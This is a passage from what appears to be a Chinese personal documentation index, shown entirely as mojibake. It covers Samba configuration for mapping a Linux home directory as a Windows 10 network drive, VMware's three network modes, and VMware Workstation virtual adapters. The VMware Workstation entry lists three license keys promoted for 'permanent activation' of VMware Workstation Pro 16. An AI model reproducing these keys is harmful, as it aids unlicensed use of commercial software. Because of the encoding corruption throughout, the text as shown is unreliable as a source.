æ˜¯å¦æœ‰å†™æƒé™ è‡ªå·±æœºå™¨çš„é…ç½®: [luyi] comment = \"luyi\" path = /home/luyi writable = yes æ·»åŠ ç”¨æˆ· æ·»åŠ ç”¨æˆ·å¹¶è®¾ç½®å¯†ç : pdbedit -a luyi æœ€åæ‰“å¼€win10çš„è®¡ç®—æœºæ˜ å°„ç½‘ç»œé©±åŠ¨å™¨ è­¦å‘Š ä½¿ç”¨ pdbedit æ–°å»ºçš„ç”¨æˆ·å, å¿…é¡»æ˜¯å½“å‰ç³»ç»Ÿå·²å­˜åœ¨çš„ç”¨æˆ·å. over æ³¨è§£ lzä½¿ç”¨çš„æ˜¯debian10ï¼Œsambaç‰ˆæœ¬ä¸º4.9.5-debianï¼ŒsambaæœåŠ¡åä¸ºsmbd. æ‰€ä»¥å¯åŠ¨ä¹‹ç±»çš„éœ€è¦ service smdb startï¼Œä¹‹å‰ç”¨samba tabå‡ºæ¥çš„ä¸€ç›´æŠ¥é”™æ‰¾äº†åŠå¤©åŸå› ...... è™šæ‹Ÿæœºè¦ä¿è¯è·Ÿå®¿ä¸»æœºä¹‹é—´å¯ä»¥ç›¸äº’pingé€š win10å®¿ä¸»æœºå»ºè®®å¼€å¯ä»¥ä¸‹é…ç½®ï¼š æˆ‘çš„ç”µè„‘å³é”® --> ç®¡ç† --> æœåŠ¡å’Œåº”ç”¨ç¨‹åº --> æœåŠ¡, æ‰¾åˆ°TCP/IP NetBIOS Helperï¼Œå°†å¯åŠ¨ç±»å‹ä¿®æ”¹ä¸ºè‡ªåŠ¨å¹¶ä¸”å¯åŠ¨å®ƒ å®‰è£…è™šæ‹Ÿæœºï¼Œè¿˜æ˜¯ä½¿ç”¨workstationå§ï¼Œvitrualboxä¸€ç›´æœ‰é—®é¢˜ï¼Œåç»­ç‰ˆæœ¬è¿˜è·Ÿwin10ä¸å…¼å®¹ èµ„æ–™äº†è§£ Sambaæ˜¯ä¸€ä¸ªèƒ½è®©Linuxç³»ç»Ÿåº”ç”¨Microsoftç½‘ç»œé€šè®¯åè®®çš„è½¯ä»¶ï¼Œ è€ŒSMBæ˜¯Server Message Blockçš„ç¼©å†™ï¼Œå³ä¸ºæœåŠ¡å™¨æ¶ˆæ¯å— ï¼Œ SMBä¸»è¦æ˜¯ä½œä¸ºMicrosoftçš„ç½‘ç»œé€šè®¯åè®®ï¼Œåæ¥Sambaå°†SMBé€šä¿¡åè®®åº”ç”¨åˆ°äº†Linuxç³»ç»Ÿä¸Šï¼Œ å°±å½¢æˆäº†ç°åœ¨çš„Sambaè½¯ä»¶ã€‚åæ¥å¾®è½¯åˆæŠŠ SMB æ”¹åä¸º CIFSï¼ˆCommon Internet File Systemï¼‰ï¼Œ å³å…¬å…± Internet æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”åŠ å…¥äº†è®¸å¤šæ–°çš„åŠŸèƒ½ï¼Œè¿™æ ·ä¸€æ¥ï¼Œä½¿å¾—Sambaå…·æœ‰äº†æ›´å¼ºå¤§çš„åŠŸèƒ½ã€‚ ä¸»è¦é…ç½®ä»‹ç» é…ç½®æ–‡ä»¶çš„å¤§æ¦‚ç»„æˆglobalã€homesã€printers global globalå®šä¹‰å…¨å±€çš„é…ç½®: [global] workgroup = MYGROUP # å·¥ä½œç»„ï¼ŒæŒ‰winä¸‹çš„ç†è§£å³å¯ # winé»˜è®¤ä¸ºWORKGROUP server string = Samba Server Version %v security = user # securityé»˜è®¤(user)ç”¨æˆ·çº§åˆ«ï¼Œ # è¯¦è§ä¸‹å…³äºsecurityçº§åˆ« passdb backend = tdbsam # passdb backend ï¼ˆç”¨æˆ·åå°ï¼‰ï¼Œ # sambaæœ‰ä¸‰ç§ç”¨æˆ·åå°ï¼š # smbpasswd, tdbsamå’Œldapsam # è¯¦è§ä¸‹å…³äºsambaä¸‰ç§ç”¨æˆ·åå° load printers = yes # è®¾ç½®æ‰“å°æœºç›¸å…³ cups options = raw # è®¾ç½®æ‰“å°æœºç›¸å…³ masks = 0700 # è®¾ç½®æ–‡ä»¶æ©ç , å¦‚700è¡¨ç¤ºæ–°å»ºæ–‡ä»¶çš„æƒé™, globalå…¶ä»–çš„å‚æ•°: netbios name = MYSERVER # è®¾ç½®å‡ºç°åœ¨\"ç½‘ä¸Šé‚»å±…\"ä¸­çš„ä¸»æœºå hosts allow = 127. 192.168.12. 192.168.13. # ç”¨æ¥è®¾ç½®å…è®¸çš„ä¸»æœºï¼Œå¦‚æœåœ¨å‰é¢åŠ \";\"åˆ™è¡¨ç¤ºå…è®¸æ‰€æœ‰ä¸»æœº log file = /var/log/samba/%m.log # å®šä¹‰sambaçš„æ—¥å¿—ï¼Œè¿™é‡Œçš„%mæ˜¯ä¸Šé¢çš„netbios name max log size = 50 # æŒ‡å®šæ—¥å¿—çš„æœ€å¤§å®¹é‡ï¼Œå•ä½æ˜¯K homes homesæ˜¯å…±äº«ç”¨æˆ·è‡ªå·±çš„å®¶ç›®å½•, é’ˆå¯¹å…±äº«ç›®å½•ä¸ªåˆ«çš„è®¾ç½®ï¼Œåªå¯¹å½“å‰çš„å…±äº«èµ„æºèµ·ä½œç”¨, ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ç”¨æˆ·ç™»å½•åˆ°sambaæœåŠ¡å™¨ä¸Šæ—¶å®é™…ä¸Šæ˜¯è¿›å…¥åˆ°äº†è¯¥ç”¨æˆ·çš„å®¶ç›®å½•ï¼Œ ç”¨æˆ·ç™»é™†åï¼Œå…±äº«åä¸æ˜¯homesè€Œæ˜¯ç”¨æˆ·è‡ªå·±çš„æ ‡è¯†ç¬¦ï¼Œå¯¹äºå•çº¯çš„æ–‡ä»¶å…±äº«çš„ç¯å¢ƒæ¥è¯´ï¼Œè¿™éƒ¨åˆ†å¯ä»¥æ³¨è§†æ‰: [homes] comment = Home Directories browseable = no writable = yes mask = 0700 # è®¾ç½®æ–‡ä»¶æ©ç , å¦‚700è¡¨ç¤ºæ–°å»ºæ–‡ä»¶çš„æƒé™, è­¦å‘Š å†æ¬¡ç”³æ˜, æ­¤å¤„çš„ homes è¡¨ç¤ºç”¨æˆ·å, æ¯”å¦‚æˆ‘ç³»ç»Ÿæœ‰ä¸€ä¸ª luyi ç”¨æˆ·, é‚£ä¹ˆ ä½¿ç”¨ pdbeditå‘½ä»¤ åˆ›å»ºçš„ç”¨æˆ·ä¹Ÿéœ€è¦æ˜¯ luyi pdbedit -a luyi è¿™é‡Œçš„ homes çš„å€¼ä¹Ÿä¸º luyi [luyi] comment = \"luyi\" path = /home/luyi writable = yes ... è¡¨ç¤ºé’ˆå¯¹ luyi è¿™ä¸€ä¸ªç”¨æˆ·åšæ›´è¯¦ç»†çš„é…ç½®. printers printersè®¾ç½®è¯¥éƒ¨åˆ†å†…å®¹è®¾ç½®æ‰“å°æœºå…±äº«: [printers] comment = All Printers path = /var/spool/samba browseable = no guest ok = no writable = no printable = yes å…³äºsecurityçº§åˆ« å®‰å…¨çº§åˆ«è§£æï¼š shareæ¨¡å¼ï¼šä¸ç”¨è¿›è¡Œæƒé™åŒ¹é…æ£€æŸ¥å³å¯è®¿é—®å…±äº«èµ„æºï¼Œå®‰å…¨æ€§æ¯”è¾ƒå·®ï¼› useræ¨¡å¼ï¼šéœ€è¦å¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡ŒéªŒè¯ï¼Œé€šè¿‡åæ‰èƒ½è®¿é—®å…±äº«èµ„æºï¼Œå…·æœ‰ä¸€å®šçš„å®‰å…¨æ€§ï¼› serveræ¨¡å¼ï¼šé€šè¿‡æŒ‡å®šçš„æœåŠ¡å™¨å¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡ŒéªŒè¯ï¼Œå¦‚æœä¸é€šè¿‡ï¼Œå®¢æˆ·ç«¯ä¼šç”¨userçº§åˆ«è®¿é—®ï¼› domainæ¨¡å¼ï¼šdomainçº§åˆ«çš„SambaæœåŠ¡å™¨åªä½œä¸ºåŸŸçš„æˆå‘˜å®¢æˆ·ç«¯åŠ å…¥WindowsåŸŸä¸­ï¼Œç”±WindowsåŸŸæ§åˆ¶å™¨æ¥å®Œæˆå¯¹ç”¨æˆ·åå’Œå¯†ç çš„éªŒè¯ï¼› adsæ¨¡å¼ï¼šå¦‚æœSambaæœåŠ¡å™¨ä»¥adsæ–¹å¼åŠ å…¥WindowsåŸŸä¸­ï¼Œå°†å…·å¤‡domiançº§åˆ«çš„æ‰€æœ‰åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥å®Œæˆå¯¹ç”¨æˆ·åå’Œå¯†ç çš„éªŒè¯å·¥ä½œã€‚ å…³äºsambaä¸‰ç§ç”¨æˆ·åå° smbpasswd è¯¥æ–¹å¼æ˜¯ä½¿ç”¨smbå·¥å…·smbpasswdç»™ç³»ç»Ÿç”¨æˆ·ï¼ˆçœŸå®ç”¨æˆ·æˆ–è€…è™šæ‹Ÿç”¨æˆ·ï¼‰è®¾ç½®ä¸€ä¸ªSamba å¯†ç ï¼Œ å®¢æˆ·ç«¯å°±ç”¨æ­¤å¯†ç è®¿é—®Sambaèµ„æºã€‚smbpasswdåœ¨/etc/sambaä¸­ï¼Œæœ‰æ—¶éœ€è¦æ‰‹å·¥åˆ›å»ºè¯¥æ–‡ä»¶: -a: æ·»åŠ  -x: åˆ é™¤ -d: ç¦ç”¨ -e: å¯ç”¨ -L: åˆ—å‡ºç›¸å…³ä¿¡æ¯ -v: ä¸Læ­é…ä½¿ç”¨ï¼Œåˆ—å‡ºæ›´å¤šä¿¡æ¯ -w: æ­é…Lï¼Œä½¿ç”¨æ—§ç‰ˆæ ¼å¼ -r: ä¿®æ”¹ä¸€ä¸ªè´¦æˆ·çš„ç›¸å…³ä¿¡æ¯ -m: åæ¥æœºå™¨ä»£ç (machine account)ï¼Œä¸ domain model æœ‰å…³ï¼ tdbsam ä½¿ç”¨æ•°æ®åº“æ–‡ä»¶åˆ›å»ºç”¨æˆ·æ•°æ®åº“ã€‚ æ•°æ®åº“æ–‡ä»¶å«passdb.tdbï¼Œåœ¨/etc/sambaä¸­ã€‚ passdb.tdbç”¨æˆ·æ•°æ®åº“å¯ä½¿ç”¨smbpasswd â€“aåˆ›å»ºSambaç”¨æˆ·ï¼Œè¦åˆ›å»ºçš„Sambaç”¨æˆ·å¿…é¡»å…ˆæ˜¯ç³»ç»Ÿç”¨æˆ·ã€‚ ä¹Ÿå¯ä½¿ç”¨pdbeditåˆ›å»ºSambaè´¦æˆ·ã€‚pdbeditå‚æ•°å¾ˆå¤šï¼Œåˆ—å‡ºå‡ ä¸ªä¸»è¦çš„: pdbedit â€“a usernameï¼šæ–°å»ºSambaè´¦æˆ·ã€‚ pdbedit â€“x usernameï¼šåˆ é™¤Sambaè´¦æˆ·ã€‚ pdbedit â€“Lï¼šåˆ—å‡ºSambaç”¨æˆ·åˆ—è¡¨ï¼Œè¯»å–passdb.tdbæ•°æ®åº“æ–‡ä»¶ã€‚ pdbedit â€“Lvï¼šåˆ—å‡ºSambaç”¨æˆ·åˆ—è¡¨è¯¦ç»†ä¿¡æ¯ã€‚ pdbedit â€“c \"[D]\"â€“u usernameï¼šæš‚åœè¯¥Sambaç”¨æˆ·è´¦å·ã€‚ pdbedit â€“c \"[]\"â€“u usernameï¼šæ¢å¤è¯¥Sambaç”¨æˆ·è´¦å·ã€‚ ldapsam åŸºäºLDAPè´¦æˆ·ç®¡ç†æ–¹å¼éªŒè¯ç”¨æˆ·ã€‚é¦–å…ˆè¦å»ºç«‹LDAPæœåŠ¡ï¼Œ è®¾ç½®: passdb backend = ldapsam:ldap://LDAP Server pdbeditå‘½ä»¤ pdbedit å‚æ•°åŠåŠŸèƒ½ï¼špdbeditå‘½ä»¤æ˜¯sambaçš„ç”¨æˆ·ç®¡ç†å‘½ä»¤ å‚æ•° ä½œç”¨ -a user å»ºç«‹sambaçš„ç”¨æˆ·user -r user ä¿®æ”¹sambaçš„ç”¨æˆ·user -x user åˆ é™¤sambaçš„ç”¨æˆ·user -L åˆ—å‡ºç”¨æˆ·åˆ—è¡¨ -Lv åˆ—å‡ºç”¨æˆ·è¯¦ç»†ä¿¡æ¯çš„åˆ—è¡¨ -c \"[D]\" -u user æš‚åœè¯¥sambaç”¨æˆ·user -c \"[D]\" -u user æ¢å¤è¯¥sambaç”¨æˆ·user æ³¨è§£ ä½¿ç”¨pdbeditåˆ›å»ºå¥½ç”¨æˆ·å, è¾“å‡ºä¼šæç¤ºé“¾æ¥çš„ç½‘ç»œè·¯å¾„.","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Use-Samba-to-implement-the-win10-disk-drive-to-access-Linux.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Use-Samba-to-implement-the-win10-disk-drive-to-access-Linux.html"},{"title":"VMware ä¸‰ç§ç½‘ç»œæ¨¡å¼","text":"å‚è€ƒ: https://www.cnblogs.com/pipci/p/12271190.html https://wenku.baidu.com/view/7d6f1a3f084e767f5acfa1c7aa00b52acfc79c1d ç½‘å¡ã€è·¯ç”±å™¨ã€äº¤æ¢æœº ç½‘å¡ æ˜¯ç”µè„‘å†…ç½®çš„ç¡¬ä»¶ï¼Œä¸€èˆ¬çš„ç¬”è®°æœ¬ä¼šæœ‰ä¸¤ä¸ªç½‘å¡: ä»¥å¤ªç½‘ç½‘å¡ï¼Œæœ‰çº¿ä¸Šç½‘ç”¨ Wi-Fiç½‘å¡ï¼Œæ— çº¿ä¸Šç½‘ä½¿ç”¨ã€‚ Windows ç½‘ç»œé€‚é…å™¨ è·¯ç”±å™¨ ä¸€èˆ¬æœ‰å‡ ä¸ªåŠŸèƒ½ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç½‘å…³ï¼Œæ§åˆ¶ä¸‹è¡Œç½‘ç»œã€‚ç¬¬äºŒä¸ªæ˜¯æ‰©å±•æœ‰çº¿ç½‘ç»œç«¯å£ï¼Œæ¯”å¦‚å®¶é‡Œæœ‰å››ä¸ªæˆ¿é—´ï¼Œæ¯ä¸ªæˆ¿é—´éƒ½è¦æœ‰ä¸€ä¸ªç½‘å£ã€‚ç¬¬ä¸‰ä¸ªæ˜¯WiFiåŠŸèƒ½ï¼Œå¯ä»¥æ¥å…¥æ— çº¿è®¾å¤‡ã€‚ äº¤æ¢æœº ä¸€èˆ¬åªæœ‰æ‰©å±•æœ‰çº¿ç½‘ç»œç«¯å£ä¸€ä¸ªåŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥æŠŠå±€åŸŸç½‘çš„ç”µè„‘ç»„å»ºæˆä¸€ä¸ªç½‘ç»œã€‚ å¦‚æœåªæœ‰äº¤æ¢æœºæ²¡æœ‰è·¯ç”±å™¨æ˜¯ä¸èƒ½ä¸Šç½‘çš„ã€‚ æœ€åï¼šæˆ‘ä»¬çœ‹ä¸‹æ€»ä½“çš„ç½‘ç»œç»“æ„å›¾ï¼šäº¤æ¢æœºæ˜¯ç”¨æ¥æ‰©å±•æ¥å£ï¼Œæˆ–è€…æŠŠå±€åŸŸç½‘çš„ç”µè„‘è¿æ¥åˆ°ä¸€ä¸ªç½‘ç»œç¯å¢ƒç”¨çš„ã€‚è·¯ç”±å™¨å¸®æˆ‘ä»¬è¿æ¥åˆ°äº’è”ç½‘ã€‚ ç½‘ç»œç»“æ„å›¾ è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨ é¦–å…ˆï¼Œè™šæ‹Ÿæœºæœ‰ä¸‰ä¸ªè™šæ‹Ÿäº¤æ¢æœºï¼Œåˆ†åˆ«å¯¹åº”äºä¸‰ç§æ¨¡å¼ã€‚ ä¸‰ä¸ªè™šæ‹Ÿæœºäº¤æ¢æœº è™šæ‹Ÿäº¤æ¢æœºç§ç±» è™šæ‹Ÿäº¤æ¢æœº ç”¨é€” VMnet0 æ¡¥æ¥æ¨¡å¼ VMnet1 ä»…ä¸»æœºæ¨¡å¼ VMnet8 NATæ¨¡å¼ æ³¨æ„ï¼Œåå­—çŸ­çš„æ˜¯è™šæ‹Ÿæœºäº¤æ¢æœºã€‚ å› ä¸ºæˆ‘ä»¬å‰é¢è®²è¿‡äº†ï¼Œäº¤æ¢æœºçš„ä½œç”¨æ˜¯æ‰©å±•æ¥å£æˆ–è€…ç»„ç½‘ï¼Œæ‰€ä»¥è¿™äº›è™šæ‹Ÿæœºäº¤æ¢æœºçš„ä½œç”¨å°±æ˜¯è®©ç›¸åŒç½‘ç»œæ¨¡å¼çš„è™šæ‹Ÿæœºèƒ½å¤Ÿç›¸äº’è¿æ¥ã€‚ å¦å¤–ï¼Œå®‰è£…Vmwareè½¯ä»¶çš„æ—¶å€™ï¼Œå®ƒè¿˜åœ¨æˆ‘ä»¬çš„ç‰©ç†æœºé‡Œé¢å®‰è£…äº†ä¸¤ä¸ªè™šæ‹Ÿç½‘å¡ã€‚ è™šæ‹Ÿç½‘å¡ è™šæ‹Ÿç½‘å¡ è™šæ‹Ÿç½‘å¡åç§° ç”¨é€” VMware Network Adapter VMnet1 ä»…ä¸»æœºæ¨¡å¼ VMware Network Adapter VMnet8 NATæ¨¡å¼ åå­—é•¿çš„æ˜¯è™šæ‹Ÿç½‘å¡ã€‚ è™šæ‹Ÿç½‘å¡ï¼Œæ˜¯ç‰©ç†æœºä½¿ç”¨çš„ï¼Œç”¨æ¥è¿æ¥åˆ°è™šæ‹Ÿäº¤æ¢æœºï¼Œå’Œè™šæ‹Ÿæœºè¿æ¥ã€‚ ä¸ºä»€ä¹ˆæ²¡æœ‰vVMware Network Adapter VMnet0å‘¢ï¼Ÿè¿™ä¸ªæˆ‘ä»¬æˆ‘ä»¬åé¢æ¥è§£ç­”ã€‚ æ³¨æ„ï¼Œä¸€ä¸ªæœºå™¨å¯ä»¥åŒæ—¶ä½¿ç”¨å¤šç§ç½‘ç»œæ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨å¤šä¸ªè™šæ‹Ÿç½‘å¡ã€‚ ä½¿ç”¨å¤šç§ç½‘ç»œæ¨¡å¼ æ¯”å¦‚ä¸€å°è™šæ‹Ÿæœºï¼ŒåŒæ—¶éœ€è¦æœ‰å†…ç½‘IPå’Œå¤–ç½‘IPï¼Œå°±å¯ä»¥æ·»åŠ ä¸¤ä¸ªç½‘ç»œé€‚é…å™¨ã€‚ å¯¹äºè¿™ä¸‰ç§ç½‘ç»œæ¨¡å¼ï¼Œæˆ‘ä»¬æœ€é‡è¦çš„æ˜¯è§£å†³ä¸¤ä¸ªé—®é¢˜ï¼š åœ¨ä¸åŒçš„ç½‘ç»œæ¨¡å¼ä¸‹ï¼š 1ã€ä¸»æœºæ€ä¹ˆå’Œè™šæ‹Ÿæœºè¿æ¥ï¼Ÿ 2ã€è™šæ‹Ÿæœºæ€ä¹ˆè¿æ¥åˆ°äº’è”ç½‘ï¼Ÿ ç½‘ç»œæ¨¡å¼ æ¡¥æ¥æ¨¡å¼ æ¡¥æ¥æ¨¡å¼ é€šä¿¡æ–¹å¼ è™šæ‹Ÿæœºé€šè¿‡è¿æ¥åˆ°è™šæ‹Ÿæœºäº¤æ¢æœºï¼Œåˆ©ç”¨è™šæ‹Ÿç½‘æ¡¥è¿æ¥åˆ°ä¸»æœºçš„ç½‘å¡ã€‚ å®ƒä¸éœ€è¦ç”¨åˆ°è™šæ‹Ÿç½‘å¡ï¼Œæ‰€ä»¥æ²¡æœ‰VMware Network Adapter VMnet0ã€‚ ç‰¹ç‚¹ ç‰©ç†æœºå’Œè™šæ‹Ÿæœºåœ°ä½å¹³ç­‰ è™šæ‹Ÿæœºå ç”¨ä¸€ä¸ªç‹¬ç«‹IP ä½¿ç”¨ç‰©ç†æœºçš„ç½‘å¡è®¿é—®äº’è”ç½‘ é…ç½® è™šæ‹ŸæœºIPç½‘æ®µå’Œä¸»æœºä¸€è‡´ è¿é€šæƒ…å†µ ä¸»æœºå’Œè™šæ‹Ÿæœºå¯ä»¥è®¿é—® è™šæ‹Ÿæœºä¹‹é—´å¯ä»¥ç›¸äº’è®¿é—® å¯ä»¥è®¿é—®äº’è”ç½‘ ä½¿ç”¨åœºæ™¯ åˆ›å»ºä¸€ä¸ªè™šæ‹ŸæœåŠ¡å™¨åœ¨å†…ç½‘æä¾›ç½‘ç»œæœåŠ¡ NAT NAT é€šä¿¡æ–¹å¼ è™šæ‹ŸNATè®¾å¤‡ï¼ˆè™šæ‹Ÿè·¯ç”±ï¼‰è¿æ¥åˆ°VMnet8è™šæ‹Ÿäº¤æ¢æœºâ€”â€”è™šæ‹Ÿæœºè”ç½‘ç”¨ ä¸»æœºé€šè¿‡VMware Network Adapter VMnet8è™šæ‹Ÿç½‘å¡è¿æ¥åˆ°VMnet8è™šæ‹Ÿäº¤æ¢æœºâ€”â€”ä¸»æœºå’Œè™šæ‹Ÿæœºè¿æ¥ç”¨ æ³¨è§£ è™šæ‹ŸDHCPæœåŠ¡å™¨è¿æ¥åˆ°VMnet8è™šæ‹Ÿäº¤æ¢æœº ç‰¹ç‚¹ è™šæ‹Ÿæœºåœ¨å¤–éƒ¨ç½‘ç»œä¸­æ²¡æœ‰è‡ªå·±çš„IPåœ°å€ è™šæ‹ŸNATè®¾å¤‡ä¼šæŠŠä¸“ç”¨ç½‘ç»œä¸­çš„ IP åœ°å€è½¬æ¢ä¸ºä¸»æœºç³»ç»Ÿçš„ IP åœ°å€â€”â€”ç½‘ç»œåœ°å€è½¬æ¢ ä¸»æœºå¯ä»¥è”ç½‘ï¼Œè™šæ‹Ÿæœºå°±å¯ä»¥è”ç½‘ é…ç½® æ—  è¿é€šæƒ…å†µ ä¸»æœºå’Œè™šæ‹Ÿæœºå¯ä»¥è®¿é—® è™šæ‹Ÿæœºä¹‹é—´å¯ä»¥ç›¸äº’è®¿é—® å¯ä»¥è®¿é—®äº’è”ç½‘ æœ¬æœºè™šæ‹Ÿæœºå¯ä»¥è®¿é—®å…¶ä»–ä¸»æœº å…¶ä»–ä¸»æœºä¸èƒ½è®¿é—®æœ¬æœºè™šæ‹Ÿæœºã€‚è§£å†³åŠæ³•ï¼šå…±äº«ç½‘ç»œã€ç«¯å£æ˜ å°„ ä½¿ç”¨åœºæ™¯ å¤§éƒ¨åˆ†æƒ…å†µ ä»…ä¸»æœº ä»…ä¸»æœº é€šä¿¡æ–¹å¼ ä¸»æœºä½¿ç”¨VMware Network Adapter VMnet1è™šæ‹Ÿç½‘å¡è¿æ¥åˆ°VMnet1è™šæ‹Ÿäº¤æ¢æœº ç‰¹ç‚¹ æ²¡æœ‰äº†è™šæ‹ŸNATè®¾å¤‡ï¼Œæ‰€ä»¥ä¸èƒ½ä¸Šç½‘ è¿é€šæƒ…å†µ ä¸»æœºå’Œè™šæ‹Ÿæœºå¯ä»¥è®¿é—® è™šæ‹Ÿæœºä¹‹é—´å¯ä»¥ç›¸äº’è®¿é—® ä¸èƒ½è®¿é—®äº’è”ç½‘ï¼Œè§£å†³åŠæ³•ï¼šä¸»æœºç½‘å¡å…±äº«ç»™VMware Network Adapter VMnet1ç½‘å¡ ä¸èƒ½è®¿é—®å…¶ä»–ä¸»æœº å…¶ä»–ä¸»æœºä¸èƒ½è®¿é—®æœ¬æœºè™šæ‹Ÿæœº ä½¿ç”¨åœºæ™¯ åˆ›å»ºä¸€ä¸ªä¸å…¶ä»–æœºå™¨éš”ç¦»çš„ç½‘ç»œ æ€»ç»“ åœ¨ç½‘ç»œæ¨¡å¼çš„åŒºåˆ«é‡Œé¢ï¼Œåªéœ€è¦è®°ä½1ã€ç‰¹ç‚¹2ã€ä½¿ç”¨åœºæ™¯å°±å¯ä»¥äº†ã€‚ä¸éœ€è¦è®°ä½ä¸Šç½‘åˆ°åº•æ˜¯æ€ä¹ˆå®ç°çš„ã€‚ ç»“è®º æ¡¥æ¥éœ€è¦ä¸€ä¸ªé¢å¤–çš„IP NATæ¨¡å¼æ˜¯æœ€ç®€å•çš„ ä»…ä¸»æœºç”¨äºå°é—­ç½‘ç»œ æ³¨è§£ åŸæ–‡åœ°å€: https://cloud.fynote.com/share/d/12926 è®¿é—®ç : 6379","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-VMware-three-network-modes.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-VMware-three-network-modes.html"},{"title":"VMware Workstation","text":"æ³¨è§£ VMware Workstation Pro 16 è®¸å¯è¯å¯†é’¥ï¼Œæ‰¹é‡æ°¸ä¹…æ¿€æ´»ï¼: ZF3R0-FHED2-M80TY-8QYGC-NPKYF YF390-0HF8P-M81RQ-2DXQE-M2UT6 ZF71R-DMX85-08DQY-8YMNC-PPHV8 å½“æˆ‘ä»¬å®‰è£…VMware Workstationåï¼Œåœ¨ å®¿ä¸»æœº ï¼ˆç‰©ç†ç”µè„‘ï¼‰ ä¸Šä¼šå¤šå‡ºä¸¤ä¸ªç½‘å¡ï¼ŒVMNet1ã€VMNet8ï¼Œ åœ¨è™šæ‹Ÿæœºè®¾ç½®é‡Œä¼šå¤šå‡ºä¸€ä¸ªé…ç½® VMNet0ã€‚ vmnet1å’Œvmnet8æ˜¯ä¸¤ä¸ªè™šæ‹Ÿç½‘å¡ï¼Œä¸»è¦ä½œç”¨æ˜¯è®©è™šæ‹Ÿæœºå¯ä»¥é€šè¿‡ä½ çš„å®¿ä¸»æœºçš„ç½‘çº¿ä¸Šç½‘ã€‚ æ³¨æ„ï¼šå¦‚æœæœ‰\"ï¼\"ï¼Œè¯´æ˜ä¸èƒ½ç”¨ã€‚ vmnet1æ˜¯ä¸ºhost-onlyæ–¹å¼æœåŠ¡çš„ï¼Œvmnet8æ˜¯ä¸ºNATæ–¹å¼æœåŠ¡çš„ã€‚ ä¸€ä¸ªæ˜¯è®¾ç½®ç§æœ‰ç½‘ç»œï¼ˆHost Onlyï¼‰æ—¶ï¼Œç”¨æ¥å’Œä¸»æœºé€šä¿¡çš„ï¼Œ ç¦ç”¨ä»¥åå°±æ— æ³•æ­£å¸¸ä½¿ç”¨Host-Onlyæ¨¡å¼äº†ï¼Œ å¦ä¸€ä¸ªæ˜¯è®¾ç½®ç½‘ç»œåœ°å€ç¿»è¯‘ï¼ˆNATï¼‰æ—¶ï¼Œå’Œä¸»æœºé€šè®¯ä½¿ç”¨çš„ï¼Œ å¦‚æœç¦ç”¨ï¼Œé‚£ä¹ˆè™šæ‹Ÿæœºåœ¨NATæ¨¡å¼ä¸‹ä¾ç„¶å¯ä»¥é€šè¿‡ä¸»æœºç½‘å¡è®¿é—®å¤–ç½‘ï¼Œ ä½†ä¸èƒ½é€šè¿‡å†…éƒ¨ç½‘ç»œå’Œä¸»æœºç›´æ¥é€šä¿¡ã€‚ è€Œä½¿ç”¨æ¡¥æ¥ç½‘ç»œæ—¶ï¼Œåˆ™ä¸éœ€è¦è¿™ä¸¤ä¸ªç½‘å¡äº†ã€‚ é€šè¿‡NATæ–¹å¼ä¸Šç½‘çš„guestç³»ç»Ÿä¸ä¸»æœºé€šä¿¡éœ€è¦VMnet8ç½‘å¡çš„æ”¯æŒï¼Œ ä½¿ç”¨Host-Onlyæ¨¡å¼çš„guestç³»ç»Ÿä¸ä¸»æœºé€šä¿¡éœ€è¦VMnet1ç½‘å¡çš„æ”¯æŒï¼Œ ä½¿ç”¨æ¡¥æ¥æ¨¡å¼ä¸Šç½‘éœ€è¦ç½‘ç»œä¸­å­˜åœ¨DHCPæœåŠ¡å™¨ï¼Œä¸”æä¾›æœåŠ¡ã€‚ VMnet8æä¾›NATå’ŒDHCPæœåŠ¡ï¼ŒVMnet1æä¾›DHCPæœåŠ¡ã€‚ VMNet1 ä½¿ç”¨çš„æ˜¯host-onlyçš„é“¾æ¥æ¨¡å¼ï¼Œå³è™šæ‹Ÿæœºåªèƒ½ä¸ä¸»æœºæ„æˆå†…éƒ¨é€šä¿¡ï¼Œæ— æ³•å¯¹å¤–ç½‘è¿›è¡Œè®¿é—®ã€‚ VMNet8 æ¨¡å¼ï¼š NATç½‘ç»œæ¨¡å¼ åœºæ™¯ï¼š åœ¨å®¿ä¸»æœºå®‰è£…å¤šå°è™šæ‹Ÿæœºï¼Œå’Œå®¿ä¸»ç»„æˆä¸€ä¸ªå°å±€åŸŸç½‘ï¼Œ å®¿ä¸»æœºï¼Œè™šæ‹Ÿæœºä¹‹é—´éƒ½å¯ä»¥äº’ç›¸é€šä¿¡ï¼Œè™šæ‹Ÿæœºä¹Ÿå¯è®¿é—®å¤–ç½‘ï¼Œ ä¾‹å¦‚ æ­å»º hadoop é›†ç¾¤ï¼Œåˆ†å¸ƒå¼æœåŠ¡ ä½¿ç”¨Vmnet8è™šæ‹Ÿäº¤æ¢æœºï¼Œæ­¤æ—¶è™šæ‹Ÿæœºå¯ä»¥é€šè¿‡ä¸»æœºå•å‘ç½‘ç»œä¸Šçš„å…¶ä»–å·¥ä½œç«™ï¼Œå…¶ä»–å·¥ä½œç«™ä¸èƒ½è®¿é—®è™šæ‹Ÿæœºã€‚ VMNet0 æ¨¡å¼ï¼š ä½¿ç”¨æ¡¥æ¥æ¨¡å¼ï¼Œå®‰è£…VMåï¼Œåœ¨VMé‡Œå»ºç«‹è™šæ‹Ÿæœº é»˜è®¤ å°±æ˜¯è¯¥æ¨¡å¼ã€‚ åœºæ™¯ï¼š å¦‚æœä½ åªæ˜¯éœ€è¦ä¸€å°è™šæ‹Ÿæœºå¯ä»¥å’Œå®¿ä¸»äº’é€šï¼Œå¹¶å¯ä»¥è®¿é—®å¤–ç½‘ï¼Œæ­¤æ¨¡å¼å³å¯ã€‚ æè¿°ï¼š 